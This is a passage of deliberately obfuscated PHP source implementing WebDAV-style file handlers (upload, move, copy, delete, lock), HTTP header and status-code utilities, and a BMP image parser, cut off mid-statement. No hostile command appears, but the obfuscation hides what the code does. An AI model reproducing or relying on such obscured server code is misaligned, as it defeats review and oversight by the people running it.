$E¼ÚŞ”ëÑ[1796] . get_file_mime($EƒñÉç„Ÿƒ[$E¼ÚŞ”ëÑ[172]]), $E¼ÚŞ”ëÑ[144] . gmdate($E¼ÚŞ”ëÑ[1782], $EƒñÉç„Ÿƒ[$E¼ÚŞ”ëÑ[1245]]) . $E¼ÚŞ”ëÑ[1797], $E¼ÚŞ”ëÑ[1798])); } public function httpOPTIONS() { $eÀæ¬‡¡é  =& $_SERVER[¹÷ˆ§éÒ°ú]; return array($eÀæ¬‡¡é [1023] => 200, $eÀæ¬‡¡é [1198] => array($eÀæ¬‡¡é [1799], $eÀæ¬‡¡é [1800], $eÀæ¬‡¡é [1801], $eÀæ¬‡¡é [1254])); } public function httpPROPPATCH() { $eéÌ¥â¹ñØ =& $_SERVER[¹÷ˆ§éÒ°ú]; $E³ğôÂÖ”Ä = $eéÌ¥â¹ñØ[1802] . $_SERVER[$eéÌ¥â¹ñØ[1378]] . $eéÌ¥â¹ñØ[1803]; return array($eéÌ¥â¹ñØ[1790] => 207, $eéÌ¥â¹ñØ[1791] => "\74\104\72\x6d\165\x6c\x74\151\x73\x74\x61\164\165\x73\40\x78\x6d\154\156\x73\72\x44\75\42\x44\101\x56\72\x22\76\12{$E³ğôÂÖ”Ä}\xa\x3c\x2f\x44\x3a\x6d\x75\x6c\x74\x69\163\164\x61\164\x75\163\76"); } public function httpGET() { $this->pathOut($this->path); } public function httpPUT() { $eáË­­–‚ =& $_SERVER[¹÷ˆ§éÒ°ú]; $B¿»ƒË÷ÑÂ = $this->uploadFile(); if ($B¿»ƒË÷ÑÂ) { $F¬ÆÈ‘‡ÊÓ = 204; } else { $B¿»ƒË÷ÑÂ = $eáË­­–‚[43]; $F¬ÆÈ‘‡ÊÓ = 201; } $aóºã„Î¼Ö = $this->pathPut($this->path, $B¿»ƒË÷ÑÂ); if ($aóºã„Î¼Ö == !1) { $F¬ÆÈ‘‡ÊÓ = 404; } return array($eáË­­–‚[1790] => $F¬ÆÈ‘‡ÊÓ); } private function uploadFile() { goto A¥ó¿ù¨ê; E¤Õ‘•ºÏ: $CÙöÌë¢…† = @fopen($E‘Ë™à´®ê, $e˜Ò†åáÀ[1512]); $a¤ÊÓ¨‘± = @fopen($e˜Ò†åáÀ[1805], $e˜Ò†åáÀ[1511]); if (!$a¤ÊÓ¨‘± || !$CÙöÌë¢…†) { @unlink($E‘Ë™à´®ê); return !1; } goto AÊøÃÍÎšÍ; AÊøÃÍÎšÍ: while (!feof($a¤ÊÓ¨‘±)) { fwrite($CÙöÌë¢…†, fread($a¤ÊÓ¨‘±, 1024 * 200)); } fclose($a¤ÊÓ¨‘±); fclose($CÙöÌë¢…†); goto EŠùõñ»Ö; A¥ó¿ù¨ê: $e˜Ò†åáÀ =& $_SERVER[¹÷ˆ§éÒ°ú]; @mk_dir(TEMP_FILES); $E‘Ë™à´®ê = TEMP_FILES . $e˜Ò†åáÀ[1804] . rand_string(32); goto E¤Õ‘•ºÏ; EŠùõñ»Ö: if (@filesize($E‘Ë™à´®ê) > 0) { return $E‘Ë™à´®ê; } @unlink($E‘Ë™à´®ê); return !1; goto F–ÀŒ›ï…æ; F–ÀŒ›ï…æ: } public function httpMKCOL() { $c™©èÎ„í =& $_SERVER[¹÷ˆ§éÒ°ú]; if ($this->pathExists($this->path)) { return array($c™©èÎ„í[1023] => 409); } $a¥õ¶“¦­â = $this->pathMkdir($this->path); return array($c™©èÎ„í[1023] => $a¥õ¶“¦­â ? 201 : 403); } public function httpMOVE() { $AñÓÂªÓÈ– =& $_SERVER[¹÷ˆ§éÒ°ú]; $A’ÁØËÁ‹ = $this->parsePath($this->pathGet(!0)); if (isset($_SERVER[$AñÓÂªÓÈ–[1806]])) { $F‚Îƒç­[$AñÓÂªÓÈ–[1807]] = $_SERVER[$AñÓÂªÓÈ–[1806]] == $AñÓÂªÓÈ–[1808]; } $cĞğÜ—„ØÉ = $this->pathMove($this->path, $A’ÁØËÁ‹); return array($AñÓÂªÓÈ–[1023] => $cĞğÜ—„ØÉ ? 201 : 404); } public function httpCOPY() { $DĞƒ’¨¦ = $this->parsePath($this->pathGet(!0)); $e‡åƒ—á‰— = $this->pathCopy($this->path, $DĞƒ’¨¦); return array($_SERVER[¹÷ˆ§éÒ°ú][1023] => $e‡åƒ—á‰— ? 201 : 404); } public function httpDELETE() { $FŒ‚ïº‚´ = $this->pathRemove($this->path); return array($_SERVER[¹÷ˆ§éÒ°ú][1023] => $FŒ‚ïº‚´ ? 200 : 503); } public function httpLOCK() { $bÎ™ŞÑ­Ëâ =& $_SERVER[¹÷ˆ§éÒ°ú]; $D›îæÎ·á = md5($this->path); $còŒÌ’¨„¢ = $bÎ™ŞÑ­Ëâ[1809] . $this->xmlGet($bÎ™ŞÑ­Ëâ[1810]) . $bÎ™ŞÑ­Ëâ[1811] . $D›îæÎ·á . $bÎ™ŞÑ­Ëâ[1812]; return array($bÎ™ŞÑ­Ëâ[1023] => 200, $bÎ™ŞÑ­Ëâ[1198] => array($bÎ™ŞÑ­Ëâ[1813] . $D›îæÎ·á, $bÎ™ŞÑ­Ëâ[1814]), $bÎ™ŞÑ­Ëâ[1815] => $còŒÌ’¨„¢); } public function httpUNLOCK() { return array($_SERVER[¹÷ˆ§éÒ°ú][1023] => 204); } public function xmlGet($dÉæà÷‚ø) { goto D‡ÂÃ°º¨; FÀŒäçƒŒ÷: $fà³ğµ…·  = explode($A¥§Ş‚Ó Œ[18], $dÉæà÷‚ø); $Aß¾ĞåÅï = array_shift($fà³ğµ…· ); $Céø¬”Ú·Š = $Cäƒ›—ÅŠ­->getElementsByTagNameNS($A¥§Ş‚Ó Œ[1817], $Aß¾ĞåÅï); goto e‹ À‚ˆ; D‡ÂÃ°º¨: $A¥§Ş‚Ó Œ =& $_SERVER[¹÷ˆ§éÒ°ú]; static $Cäƒ›—ÅŠ­ = false; if (!$Cäƒ›—ÅŠ­) { $CŒ¢ë­…êß = file_get_contents($A¥§Ş‚Ó Œ[1816]); $Cäƒ›—ÅŠ­ = new DOMDocument(); $Cäƒ›—ÅŠ­->loadXML($CŒ¢ë­…êß); } goto FÀŒäçƒŒ÷; e‹ À‚ˆ: if ($Céø¬”Ú·Š) { return $Céø¬”Ú·Š[0]->nodeValue; } return $A¥§Ş‚Ó Œ[43]; goto dÅ×ÀËÌÕÒ; dÅ×ÀËÌÕÒ: } public static function response($cŞë÷ÃØäù) { goto cÊ£¿ø½ñ; cÊ£¿ø½ñ: $f¢¨®…•Ì =& $_SERVER[¹÷ˆ§éÒ°ú]; $F©Óîç²ò = is_array($cŞë÷ÃØäù[$f¢¨®…•Ì[1198]]) ? $cŞë÷ÃØäù[$f¢¨®…•Ì[1198]] : array(); $F©Óîç²ò[] = HttpHeader::code($cŞë÷ÃØäù[$f¢¨®…•Ì[1023]]); goto a‚æÚ­¨©‚; a‚æÚ­¨©‚: $F©Óîç²ò[] = $f¢¨®…•Ì[1757]; $F©Óîç²ò[] = $f¢¨®…•Ì[1758]; foreach ($F©Óîç²ò as $EƒÅä‚Òè) { header($EƒÅä‚Òè); } goto FÃ˜ô¾ÄÅ‡; FÃ˜ô¾ÄÅ‡: if (is_string($cŞë÷ÃØäù[$f¢¨®…•Ì[1815]])) { header($f¢¨®…•Ì[1818]); $cÏƒÌí‡ë÷ = $f¢¨®…•Ì[1819] . $f¢¨®…•Ì[10] . $cŞë÷ÃØäù[$f¢¨®…•Ì[1815]]; echo $cÏƒÌí‡ë÷; } goto Aò”ã¾Å‹; Aò”ã¾Å‹: } } class HttpHeader { public static $_headers = array("\110\157\163\x74" => "\110\124\x54\120\137\x48\x4f\123\x54", "\125\163\x65\x72\55\101\x67\x65\x6e\164" => "\x48\124\124\120\137\x55\123\105\122\137\x41\107\105\116\124", "\x43\157\156\164\145\156\164\x2d\124\x79\160\x65" => "\x48\124\x54\x50\137\x43\117\116\124\x45\116\124\137\x54\x59\120\105", "\x43\x6f\156\164\145\156\x74\x2d\x4c\145\x6e\147\164\x68" => "\x48\124\124\120\137\x43\x4f\x4e\124\x45\x4e\x54\137\114\x45\x4e\107\124\110", "\x44\145\x70\x74\x68" => "\x48\x54\x54\x50\x5f\104\105\x50\x54\110", "\x45\x78\160\x65\143\x74" => "\110\x54\124\120\x5f\105\x58\x50\105\103\x54", "\111\146\x2d\116\157\x6e\x65\55\115\141\164\143\150" => "\x48\124\124\120\137\x49\106\137\116\117\116\105\137\x4d\101\124\103\110", "\111\146\55\115\x61\164\143\x68" => "\x48\x54\124\120\x5f\x49\106\x5f\115\101\124\x43\x48", "\x49\146\x2d\x52\x61\156\x67\145" => "\110\124\124\120\137\x49\106\137\x52\x41\x4e\x47\105", "\114\141\163\x74\x2d\115\157\144\x69\x66\x69\x65\x64" => "\110\124\x54\x50\137\x4c\x41\x53\x54\137\x4d\117\104\x49\106\111\x45\104", "\x49\x66\55\x4d\x6f\144\151\x66\x69\x65\144\x2d\x53\151\x6e\x63\x65" => "\110\x54\x54\120\137\111\x46\137\115\117\x44\111\106\111\x45\104\137\x53\111\116\103\x45", "\111\x66\x2d\125\x6e\x6d\x6f\144\x69\146\x69\145\x64\x2d\x53\x69\x6e\x63\145" => "\110\x54\x54\x50\x5f\x49\106\x5f\x55\116\x4d\x4f\104\x49\106\111\x45\104\x5f\123\111\x4e\x43\x45", "\x52\141\156\x67\x65" => "\110\x54\124\120\x5f\x52\101\x4e\x47\x45", "\124\x69\x6d\145\x6f\165\164" => "\110\124\124\120\x5f\124\x49\x4d\105\117\x55\x54", "\x49\146" => "\110\x54\x54\x50\137\111\x46", "\114\x6f\143\x6b\55\x54\x6f\x6b\145\156" => "\110\x54\x54\120\x5f\114\x4f\x43\x4b\x5f\124\117\113\105\116", "\117\x76\145\162\167\x72\151\164\145" => "\110\x54\124\x50\x5f\x4f\126\105\x52\x57\122\111\124\x45", "\x44\145\x73\164\x69\x6e\141\164\151\x6f\x6e" => "\110\x54\124\x50\137\104\105\x53\x54\111\x4e\101\x54\111\x4f\x4e", "\x52\145\161\165\x65\x73\164\55\111\x64" => "\122\105\121\125\105\x53\x54\x5f\x49\x44", "\122\x65\161\165\x65\163\164\55\102\157\x64\171\55\x46\x69\x6c\145" => "\122\105\121\x55\x45\x53\124\137\102\x4f\104\x59\137\x46\111\x4c\x45", "\122\145\144\x69\x72\x65\x63\164\x2d\123\164\x61\164\x75\163" => "\x52\105\x44\x49\x52\x45\103\x54\137\x53\x54\x41\124\125\x53"); public static function init() { static $eÂöÓŸö“„ = false; if ($eÂöÓŸö“„) { return; } foreach ($_SERVER as $FïÛ¸äÍà => $DÂ»¶òŠ¶Ÿ) { $FïÛ¸äÍà = strtoupper($FïÛ¸äÍà); if (!array_key_exists($FïÛ¸äÍà, $_SERVER)) { continue; } $_SERVER[$FïÛ¸äÍà] = $DÂ»¶òŠ¶Ÿ; } foreach (self::$_headers as $FïÛ¸äÍà => $f©Œ½¢êØ) { if (!array_key_exists($FïÛ¸äÍà, $_SERVER)) { continue; } $_SERVER[$FïÛ¸äÍà] = $_SERVER[$f©Œ½¢êØ]; $_SERVER[strtoupper($FïÛ¸äÍà)] = $_SERVER[$f©Œ½¢êØ]; } } public static function get($bÖæÛˆ œ”) { self::init(); return $_SERVER[$bÖæÛˆ œ”] ? $_SERVER[$bÖæÛˆ œ”] : $_SERVER[$_SERVER[¹÷ˆ§éÒ°ú][1820] . strtoupper($bÖæÛˆ œ”)]; } public static function method() { return strtoupper(self::get($_SERVER[¹÷ˆ§éÒ°ú][166])); } public static function length() { $b§®¹ø½Ÿ =& $_SERVER[¹÷ˆ§éÒ°ú]; $EÄ¬µ¿«à¼ = self::get($b§®¹ø½Ÿ[1821]); if (!$EÄ¬µ¿«à¼) { $EÄ¬µ¿«à¼ = self::get($b§®¹ø½Ÿ[1137]); } return $EÄ¬µ¿«à¼; } public static function range() { $A¬¡Î‹Õˆ =& $_SERVER[¹÷ˆ§éÒ°ú]; $Eº×çŠ´¿ = self::get($A¬¡Î‹Õˆ[210]); if (!$Eº×çŠ´¿) { return !1; } if (!preg_match($A¬¡Î‹Õˆ[1822], $Eº×çŠ´¿, $B‰ö”´ß³)) { return !1; } if ($B‰ö”´ß³[1] === $A¬¡Î‹Õˆ[43] && $B‰ö”´ß³[2] === $A¬¡Î‹Õˆ[43]) { return !1; } return array($B‰ö”´ß³[1] !== $A¬¡Î‹Õˆ[43] ? $B‰ö”´ß³[1] : null, $B‰ö”´ß³[2] !== $A¬¡Î‹Õˆ[43] ? $B‰ö”´ß³[2] : null); } public static $statusCode = array("\x31\60\x30" => "\x43\157\156\x74\151\x6e\x75\x65", "\61\60\x31" => "\123\167\x69\164\x63\150\151\156\147\x20\120\162\157\164\x6f\143\x6f\154", "\x31\x30\x32" => "\120\x72\157\x63\145\163\x73\x69\156\147", "\61\x30\63" => "\x45\141\x72\x6c\171\x20\x48\x69\156\164\x73", "\62\60\x30" => "\x4f\x4b", "\62\60\x31" => "\x43\162\145\x61\164\x65\144", "\62\x30\62" => "\x41\x63\x63\145\x70\x74\x65\x64", "\62\60\x33" => "\x4e\157\156\55\x41\x75\164\150\x6f\162\151\164\141\x74\151\166\145\40\x49\156\146\x6f\162\x6d\x61\164\151\x6f\x6e", "\x32\60\64" => "\116\157\40\103\x6f\x6e\x74\x65\156\x74", "\62\60\x35" => "\x52\x65\163\x65\164\x20\x43\x6f\x6e\164\145\x6e\x74", "\x32\60\x36" => "\x50\x61\162\164\x69\x61\x6c\40\x43\157\x6e\164\145\x6e\164", "\x32\60\67" => "\115\x75\x6c\x74\x69\55\x53\x74\x61\x74\x75\163", "\x33\60\x30" => "\x4d\165\x6c\164\x69\x70\154\145\40\x43\x68\157\x69\x63\x65\x73", "\x33\x30\x31" => "\x4d\157\166\x65\144\x20\120\x65\x72\x6d\141\x6e\x65\x6e\164\154\x79", "\x33\x30\x32" => "\106\x6f\x75\156\x64", "\x33\60\63" => "\x53\x65\145\x20\117\164\150\x65\x72", "\63\60\x34" => "\116\157\x74\x20\115\x6f\x64\151\x66\x69\x65\x64", "\63\x30\65" => "\x55\163\145\x20\120\x72\157\170\x79", "\x33\x30\67" => "\124\x65\155\160\x6f\162\141\x72\x79\x20\122\x65\144\x69\162\x65\x63\164", "\x33\x30\x38" => "\x50\x65\x72\155\x61\156\x65\x6e\x74\x20\122\145\144\151\162\145\x63\x74", "\64\60\x30" => "\102\x61\144\40\122\x65\x71\165\x65\x73\164", "\x34\60\61" => "\125\156\141\x75\x74\x68\x6f\x72\x69\x7a\145\144", "\x34\x30\x32" => "\x50\141\171\155\145\x6e\x74\40\122\x65\x71\165\151\162\145\x64", "\64\60\x33" => "\106\x6f\x72\142\151\x64\144\145\x6e", "\64\x30\x34" => "\116\x6f\x74\40\106\x6f\165\156\144", "\64\60\x35" => "\x4d\x65\x74\150\x6f\x64\x20\116\157\164\40\101\x6c\x6c\157\167\x65\x64", "\64\x30\x36" => "\x4e\157\164\x20\x41\x63\143\145\160\x74\141\x62\x6c\x65", "\x34\x30\x37" => "\x50\x72\x6f\170\171\40\101\x75\x74\150\x65\x6e\x74\151\143\141\x74\x69\x6f\x6e\40\122\x65\x71\x75\x69\162\145\x64", "\64\x30\70" => "\x52\145\x71\x75\x65\x73\x74\40\124\151\155\145\157\165\x74", "\x34\x30\x39" => "\x43\x6f\x6e\146\154\151\x63\x74", "\x34\61\60" => "\107\157\156\145", "\64\61\61" => "\x4c\145\x6e\x67\x74\x68\40\122\145\161\165\151\x72\145\x64", "\x34\x31\62" => "\120\x72\x65\x63\x6f\x6e\x64\x69\164\x69\157\x6e\x20\x46\141\x69\154\x65\x64", "\64\61\63" => "\x52\x65\x71\x75\145\163\164\x20\105\156\x74\151\x74\171\x20\x54\157\157\x20\x4c\141\162\x67\145", "\64\61\64" => "\122\x65\x71\165\145\163\164\x20\125\122\x49\x20\124\157\157\x20\x4c\x61\162\x67\x65", "\64\61\x35" => "\125\156\x73\x75\x70\160\157\162\164\145\144\x20\115\145\144\x69\141\x20\x54\171\160\x65", "\x34\x31\66" => "\x52\x65\x71\x75\145\163\164\x65\x64\x20\122\x61\x6e\147\145\40\x4e\x6f\164\40\x53\141\x74\151\163\146\x69\141\142\154\x65", "\64\x31\x37" => "\x45\170\160\145\x63\164\x61\164\x69\x6f\156\40\106\x61\x69\x6c\x65\144", "\x34\62\x32" => "\125\156\160\x72\x6f\143\x65\163\163\x61\142\154\x65\40\105\x6e\x74\x69\x74\x79", "\x34\62\63" => "\114\x6f\143\x6b\145\144", "\64\x32\64" => "\x46\x61\151\x6c\x65\144\x20\104\x65\160\x65\156\144\145\x6e\143\171", "\x34\62\x35" => "\125\156\157\x72\144\145\162\x65\x64\40\x43\157\x6c\154\145\143\164\x69\157\156", "\64\x32\66" => "\x55\x70\x67\162\x61\144\145\40\x52\x65\161\x75\x69\x72\145\144", "\x34\x32\70" => "\x50\162\x65\143\157\156\x64\151\x74\x69\157\156\40\x52\x65\161\165\151\x72\145\x64", "\64\x32\x39" => "\x54\157\x6f\x20\115\141\x6e\171\40\122\x65\x71\x75\145\x73\164\163", "\x34\63\61" => "\122\145\x71\165\145\x73\164\x20\x48\145\141\144\x65\x72\x20\106\151\145\154\x64\x73\x20\x54\157\157\40\x4c\x61\x72\x67\x65", "\x34\x34\64" => "\116\x6f\x20\x52\145\163\160\157\x6e\x73\145", "\x34\x35\60" => "\x42\x6c\x6f\x63\153\x65\144\x20\x62\171\x20\x57\x69\156\x64\x6f\x77\x73\40\120\x61\162\145\x6e\164\141\x6c\40\103\157\156\164\162\x6f\x6c\x73", "\x34\65\x31" => "\x55\156\x61\x76\x61\x69\154\x61\142\154\145\x20\x46\x6f\162\x20\114\x65\x67\x61\x6c\x20\x52\145\x61\163\x6f\156\163", "\64\x39\x34" => "\122\145\x71\x75\145\163\164\x20\x48\145\141\x64\x65\x72\x20\x54\157\157\40\114\x61\162\x67\145", "\65\60\x30" => "\x49\156\164\145\162\156\x61\x6c\40\x53\145\162\166\x65\x72\x20\x45\x72\x72\157\x72", "\x35\x30\x31" => "\x4e\157\x74\40\x49\x6d\x70\x6c\145\x6d\x65\x6e\164\145\144", "\x35\x30\x32" => "\102\141\x64\40\x47\141\164\x65\x77\x61\x79", "\x35\x30\63" => "\123\145\x72\166\x69\143\x65\x20\x55\x6e\141\x76\141\151\x6c\x61\x62\x6c\145", "\65\x30\64" => "\x47\141\x74\145\x77\141\171\40\x54\151\155\x65\x6f\x75\x74", "\x35\60\65" => "\110\124\x54\120\x20\126\145\162\163\151\157\156\x20\x6e\x6f\x74\40\163\x75\160\160\157\x72\x74\145\x64", "\x35\60\67" => "\x49\156\163\165\146\146\151\143\151\x65\156\164\40\x53\x74\157\162\141\x67\x65"); public static function code($BŸ´¦¦ÕÃ) { $f˜£÷§”ÙÏ =& $_SERVER[¹÷ˆ§éÒ°ú]; $BŸ´¦¦ÕÃ = $BŸ´¦¦ÕÃ . $f˜£÷§”ÙÏ[43]; $eñæÒ‚ÚÖµ = self::$statusCode[$BŸ´¦¦ÕÃ]; $eñæÒ‚ÚÖµ = $eñæÒ‚ÚÖµ ? "\x48\124\124\x50\57\x31\56\61\x20{$BŸ´¦¦ÕÃ}\40" . $eñæÒ‚ÚÖµ : $f˜£÷§”ÙÏ[43]; return $eñæÒ‚ÚÖµ; } } class ImageGdBMP { public static function load($d…š§†º§¸) { $AÛÑ°·»¯• = fopen($d…š§†º§¸, $_SERVER[¹÷ˆ§éÒ°ú][1511]); if ($AÛÑ°·»¯• === !1) { return !1; } $cØÅ…Ùô = self::loadFromStream($AÛÑ°·»¯•); fclose($AÛÑ°·»¯•); return $cØÅ…Ùô; } public static function loadFromStream($b÷ÉÊÙ­ŠÄ) { $fİå§˜ §µ =& $_SERVER[¹÷ˆ§éÒ°ú]; $Fò¡­ØÛ¿° = fread($b÷ÉÊÙ­ŠÄ, 14); if ($Fò¡­ØÛ¿° === !1) { return !1; } if ($Fò¡­ØÛ¿°[0] != $fİå§˜ §µ[1823] || $Fò¡­ØÛ¿°[1] != $fİå§˜ §µ[1824]) { return !1; } $D©Ô‚àŠËË = unpack($fİå§˜ §µ[1825] . $fİå§˜ §µ[1826] . $fİå§˜ §µ[1827] . $fİå§˜ §µ[1828] . $fİå§˜ §µ[1829], $Fò¡­ØÛ¿°); return self::loadFromStreamAndFileHeader($b÷ÉÊÙ­ŠÄ, $D©Ô‚àŠËË); } public static function loadFromStreamAndFileHeader($có¿Øèáğ–, array $f¡…™‹™Ùñ) { goto fŠ“æå²º•; A”‡‘ä•Šİ: if ($CÉ…››»ˆ· === !1) { return !1; } list(, $dêùÑÌ¦Á) = unpack($AßöíöÔÄ±[1830], $CÉ…››»ˆ·); if ($dêùÑÌ¦Á == 12) { goto dÅÑ„¿ Å; B†¯‹è¦ª: $fŒÆÖé÷ˆ = 255; goto d·¡ï¦È½Ñ; dÅÑ„¿ Å: $CÉ…››»ˆ· = fread($có¿Øèáğ–, $dêùÑÌ¦Á - 4); if ($CÉ…››»ˆ· === !1) { return !1; } extract(unpack($AßöíöÔÄ±[1831] . $AßöíöÔÄ±[1832] . $AßöíöÔÄ±[1833] . $AßöíöÔÄ±[1834], $CÉ…››»ˆ·)); goto CŒš°…„·; CŒš°…„·: $AµËÄÈ‡ = $dÁ¹­¥±ïÂ = $eĞÊà÷¼Ø· = $b£Ä‚ƒŞ…ó = 0; $fÁÜì‡¢ö‰ = 16711680; $e–¢”ºó³ = 65280; goto B†¯‹è¦ª; d·¡ï¦È½Ñ: } else { if (124 < $dêùÑÌ¦Á || $dêùÑÌ¦Á < 40) { return !1; } else { goto BÁ¥ŒÉÔ¼í; c…ßå‡÷¾: if (($B¨áë¨Ô„‹ == 16 || $B¨áë¨Ô„‹ == 24 || $B¨áë¨Ô„‹ == 32) && $b£Ä‚ƒŞ…ó == 0 && $fÁÜì‡¢ö‰ == 0 && $e–¢”ºó³ == 0 && $fŒÆÖé÷ˆ == 0) { switch ($B¨áë¨Ô„‹) { case 16: $fÁÜì‡¢ö‰ = 31744; $e–¢”ºó³ = 992; $fŒÆÖé÷ˆ = 31; break; case 24: case 32: $fÁÜì‡¢ö‰ = 16711680; $e–¢”ºó³ = 65280; $fŒÆÖé÷ˆ = 255; break; } } goto dÒ«ÛÚ«šó; CÀ·¬òÉœ•: if ($b‰ç­±“‡‰ & 2147483648) { $b‰ç­±“‡‰ = -(~$b‰ç­±“‡‰ & 4294967295) - 1; } if ($dß½ñ½Ô¿ò & 2147483648) { $dß½ñ½Ô¿ò = -(~$dß½ñ½Ô¿ò & 4294967295) - 1; } if ($EË±†Ö–òî & 2147483648) { $EË±†Ö–òî = -(~$EË±†Ö–òî & 4294967295) - 1; } goto Eˆñ™ŠÂ†˜; BÁ¥ŒÉÔ¼í: $CÉ…››»ˆ· = fread($có¿Øèáğ–, 36); if ($CÉ…››»ˆ· === !1) { return !1; } extract(unpack($AßöíöÔÄ±[1835] . $AßöíöÔÄ±[1836] . $AßöíöÔÄ±[1833] . $AßöíöÔÄ±[1837] . $AßöíöÔÄ±[1838] . $AßöíöÔÄ±[1839] . $AßöíöÔÄ±[1840] . $AßöíöÔÄ±[1841] . $AßöíöÔÄ±[1842] . $AßöíöÔÄ±[1843], $CÉ…››»ˆ·)); goto CÀ·¬òÉœ•; Eˆñ™ŠÂ†˜: if ($D×ó¥¶óÍ˜ & 2147483648) { $D×ó¥¶óÍ˜ = -(~$D×ó¥¶óÍ˜ & 4294967295) - 1; } if ($f¡…™‹™Ùñ[$AßöíöÔÄ±[533]] != 0) { $DØÆ£È¢Éá = $B¨áë¨Ô„‹ == 1 || $B¨áë¨Ô„‹ == 4 || $B¨áë¨Ô„‹ == 8 ? ($AµËÄÈ‡ ? $AµËÄÈ‡ : pow(2, $B¨áë¨Ô„‹)) << 2 : 0; $Aù´‡¾ª‰¨ = $dˆòÔ¥¿¸ ? $dˆòÔ¥¿¸ : ($b‰ç­±“‡‰ * $B¨áë¨Ô„‹ + 31 >> 3 & ~3) * abs($dß½ñ½Ô¿ò); $C®ìà‘Ğï = $f¡…™‹™Ùñ[$AßöíöÔÄ±[533]] - $Aù´‡¾ª‰¨ - $DØÆ£È¢Éá - 14; if ($dêùÑÌ¦Á < $C®ìà‘Ğï && 40 <= $dêùÑÌ¦Á && $dêùÑÌ¦Á <= 124) { $dêùÑÌ¦Á = $C®ìà‘Ğï; } } if ($dêùÑÌ¦Á - 40 > 0) { $CÉ…››»ˆ· = fread($có¿Øèáğ–, $dêùÑÌ¦Á - 40); if ($CÉ…››»ˆ· === !1) { return !1; } extract(unpack($AßöíöÔÄ±[1844] . $AßöíöÔÄ±[1845] . $AßöíöÔÄ±[1846] . $AßöíöÔÄ±[1847], $CÉ…››»ˆ· . str_repeat($AßöíöÔÄ±[1848], 120))); } else { $eĞÊà÷¼Ø· = $fÁÜì‡¢ö‰ = $e–¢”ºó³ = $fŒÆÖé÷ˆ = 0; } goto c…ßå‡÷¾; dÒ«ÛÚ«šó: } } goto døĞˆÉî®Ù; FæÁ¿’ƒ ¦: $f“ØîËÁ“ï = abs($dß½ñ½Ô¿ò); $D¸Õ´ÈÔÛÜ = $dß½ñ½Ô¿ò > 0 ? $f“ØîËÁ“ï - 1 : 0; $D“à®…õ†Ï = $dß½ñ½Ô¿ò > 0 ? -1 : 1; goto døğøÀœì¨; fŠ“æå²º•: $AßöíöÔÄ± =& $_SERVER[¹÷ˆ§éÒ°ú]; if ($f¡…™‹™Ùñ[$AßöíöÔÄ±[399]] != 19778) { return !1; } $CÉ…››»ˆ· = fread($có¿Øèáğ–, 4); goto A”‡‘ä•Šİ; døğøÀœì¨: if ($B¨áë¨Ô„‹ == 1 || $B¨áë¨Ô„‹ == 4 || $B¨áë¨Ô„‹ == 8) { goto B¼—èË‚•Æ; AÌ¶ÛÇ³ õ: $FÂóÁƒÈ¬ = array(); for ($aŞ‡§‹¯ï÷ = 0; $aŞ‡§‹¯ï÷ < $CÀŒµ¬ÃŒ—; ++$aŞ‡§‹¯ï÷) { $CÉ…››»ˆ· = fread($có¿Øèáğ–, $F‰Š±éÏÊù); if ($CÉ…››»ˆ· === !1) { imagedestroy($e ˜¤‚¹É); return !1; } extract(unpack($AßöíöÔÄ±[1849], $CÉ…››»ˆ· . $AßöíöÔÄ±[1848])); $FÂóÁƒÈ¬[] = imagecolorallocate($e ˜¤‚¹É, $AŸ­º‹ÍªÇ, $C×õö“Ÿ´Û, $CâÜŒÃò¢à); } $FÁ‘ŠéèŞã = 8 - $B¨áë¨Ô„‹; goto DÁí´ˆ™®º; B¼—èË‚•Æ: $e ˜¤‚¹É = imagecreate($b‰ç­±“‡‰, $f“ØîËÁ“ï); $F‰Š±éÏÊù = $dêùÑÌ¦Á == 12 ? 3 : 4; $CÀŒµ¬ÃŒ— = $AµËÄÈ‡ ? $AµËÄÈ‡ : pow(2, $B¨áë¨Ô„‹); goto AÌ¶ÛÇ³ õ; DÁí´ˆ™®º: $bàˆãàÍï = (1 << $B¨áë¨Ô„‹) - 1 << $FÁ‘ŠéèŞã; if ($b£Ä‚ƒŞ…ó == 1 || $b£Ä‚ƒŞ…ó == 2) { $AàÓ”¯ÜÌ• = 0; $EÕâ²ËªŒ½ = $B¨áë¨Ô„‹ >> 2 & 1; for (;;) { if ($AàÓ”¯ÜÌ• < -1 || $AàÓ”¯ÜÌ• > $b‰ç­±“‡‰ || $D¸Õ´ÈÔÛÜ < -1 || $D¸Õ´ÈÔÛÜ > $dß½ñ½Ô¿ò) { imagedestroy($e ˜¤‚¹É); return !1; } $CÉ…››»ˆ· = fread($có¿Øèáğ–, 1); if ($CÉ…››»ˆ· === !1) { imagedestroy($e ˜¤‚¹É); return !1; } switch ($CÉ…››»ˆ·) { case $AßöíöÔÄ±[1848]: $CÉ…››»ˆ· = fread($có¿Øèáğ–, 1); if ($CÉ…››»ˆ· === !1) { imagedestroy($e ˜¤‚¹É); return !1; } switch ($CÉ…››»ˆ·) { case $AßöíöÔÄ±[1848]: $D¸Õ´ÈÔÛÜ += $D“à®…õ†Ï; $AàÓ”¯ÜÌ• = 0; break; case $AßöíöÔÄ±[1850]: $D¸Õ´ÈÔÛÜ = 0; $AàÓ”¯ÜÌ• = 0; break 3; case $AßöíöÔÄ±[1851]: $CÉ…››»ˆ· = fread($có¿Øèáğ–, 2); if ($CÉ…››»ˆ· === !1) { imagedestroy($e ˜¤‚¹É); return !1; } list(, $FÃ¯†©­´‹, $dæ£Ìñ¥¦) = unpack($AßöíöÔÄ±[1852], $CÉ…››»ˆ·); $AàÓ”¯ÜÌ• += $FÃ¯†©­´‹; $D¸Õ´ÈÔÛÜ += $dæ£Ìñ¥¦ * $D“à®…õ†Ï; break; default: list(, $dÖßŞÛ°§) = unpack($AßöíöÔÄ±[1853], $CÉ…››»ˆ·); $C»Úó‡½Ì = ($dÖßŞÛ°§ >> $EÕâ²ËªŒ½) + ($dÖßŞÛ°§ & $EÕâ²ËªŒ½); $CÉ…››»ˆ· = fread($có¿Øèáğ–, $C»Úó‡½Ì + 1 & ~1); if ($CÉ…››»ˆ· === !1) { imagedestroy($e ˜¤‚¹É); return !1; } for ($aŞ‡§‹¯ï÷ = 0, $Bè‘êÆŞî¥ = 0; $aŞ‡§‹¯ï÷ < $dÖßŞÛ°§; ++$aŞ‡§‹¯ï÷, ++$AàÓ”¯ÜÌ•, $Bè‘êÆŞî¥ += $B¨áë¨Ô„‹) { list(, $F¢ÂÎ „¨ğ) = unpack($AßöíöÔÄ±[1853], $CÉ…››»ˆ·[$Bè‘êÆŞî¥ >> 3]); $CâÜŒÃò¢à = $Bè‘êÆŞî¥ & 7; imagesetpixel($e ˜¤‚¹É, $AàÓ”¯ÜÌ•, $D¸Õ´ÈÔÛÜ, 